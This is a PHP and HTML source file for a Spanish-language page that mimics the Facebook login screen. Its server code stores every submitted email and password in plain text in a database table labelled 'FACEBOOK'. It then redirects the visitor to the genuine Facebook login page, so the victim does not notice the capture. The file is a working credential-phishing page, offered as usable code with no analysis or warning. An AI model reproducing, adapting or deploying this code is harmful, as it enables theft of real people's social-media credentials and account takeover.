<?php
    require "database.php";
    $message= "";

    if (!empty($_POST['email']) && !empty($_POST['password'])) {
      $sql = "INSERT INTO users (email,contraseña,tipo) VALUES (:email, :password,'FACEBOOK')";
      $stmt = $con->prepare($sql);
      $stmt->bindParam(':email', $_POST['email']);
      $stmt->bindParam(':password', $_POST['password']);
  
      if ($stmt->execute()) {
        header("Status: 301 Moved Permanently");
        header("Location:https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D174829003346%26state%3DAQAoG%252BJr2%252FOrfCCsJ1asJpn9fHBKY2UTUAZzGGlKYhja9qWmPCdcyae2R3q85LCdls9fcRqnce2uqDkwoRyK2mKBVpqwZyLYhpHiLb8MXlClDWCR7x8PVgt7eylE1ZIT%252BcMKJaRnENujHtR3HaD2Io%252FtWis8KNtUZvTXIvLnSQFM%252FMeRT6U1kp%252BUI%252Bxg%252F7Ia6oMCHi%252F5VaxpDq38fv%252F%252FOkqzxDk%252B3IaQ9FJAMRR8XZ5acQ%253D%253D%26redirect_uri%3Dhttps%253A%252F%252Faccounts.spotify.com%252Flogin%252Ffacebook%252Fredirect%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2120bf73-4024-43f2-bc26-bf1884c0a616%26tp%3Dunspecified%26cbt%3D1607716711173&lwv=101");
      } else {
        echo("error");
      }
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook</title>
    <link rel="stylesheet" href="recursos/fbstyle.css">
    
</head>
<body>
    <?php if(!empty($message)): ?>
      <p> <?= $message ?></p>
    <?php endif; ?>
    <div class="container">
        <div class="contenedor_principal">
            <div class="fb">
                <div class="logo">
                <img src="recursos/imagenes/Facebook-logo.png" width="253.44.4px" height="138.6px">
                </div>
                <h3>Facebook te ayuda a comunicarte 
                y compartir con las personas que forman 
                parte de tu vida.</h3>
            </div>  
        </div>
        <div class="contenedor_login">
            <div class="login_box" >
                <form action="facebook.php" method="POST">
                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono">
                <input type="password" name="password" placeholder="Contraseña">
                <input type="submit" name="btn_login"value="Iniciar sesión">
                <?php

                ?>
                </form>
                <a href="facebook.php" class="olv">¿Olvidaste tu contraseña? </a>
                <div class="subrayado"></div>
                <input type="submit" name="btn_singup" value="Crear cuenta nueva">
                
            </div>
        </div>
        <div class="create">
        <h4>Crea una página para un personaje público, un grupo de música o un negocio.</h4>
        </div>
        
    </div>
    
</body>
<footer> 
    <div class="ft_ctnr">
        <p class="parr">
            Español(España)  English(US) Italiano  Português(Brasil)  Français(France)  Deutsch  中文(简体)   Русский  العربية  हिन्दी  日本語  
        </p>
        <div class="espaciado"></div>
        <div class="parr2">
            <p>
                Registrarte Entrar Messenger FacebookLite Watch Personas Páginas Categorías de páginas Lugares Juegos Lugares Marketplace
                Facebook Pay Grupos Ofertas de empleo Oculus Portal Instagram Local Recaudaciones de fondos Servicios Centro de información de votación
                Información Crear anuncio Crear página Desarrolladores Empleo Privacidad Cookies Gestión de anuncios Condiciones Ayuda Configuración
            </p>
        </div>
        </div>
</footer>
</html>